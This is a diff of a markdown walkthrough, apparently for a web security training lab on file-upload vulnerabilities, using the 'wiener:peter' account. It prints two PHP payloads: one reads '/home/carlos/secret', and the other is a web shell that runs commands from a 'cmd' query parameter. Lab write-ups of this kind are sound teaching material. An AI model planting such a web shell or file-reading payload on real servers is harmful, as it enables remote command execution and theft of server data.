@@ -25,13 +25,14 @@ You can log in to your own account using the following credentials: `wiener:pete
 
 2. After analyzing the request, we attempted to upload a malicious file containing a PHP one-liner:
    ```php
-   <?php echo file_get_contents('/path/to/target/file'); ?>
+   <?php echo file_get_contents('/home/carlos/secret'); ?>
    ```
    We could also attempt to use others like this:
    ```php
    <?php system($_GET['cmd']); ?>
    ```
-   ![image](https://github.com/user-attachments/assets/5cbec42a-8c07-46ae-9eb2-d35de568c9cc)
+   ![image](https://github.com/user-attachments/assets/50a7c27e-46f7-4855-bb7e-2af3ca37e86a)
+
 
 
    ## **Accessing the Malicious File**
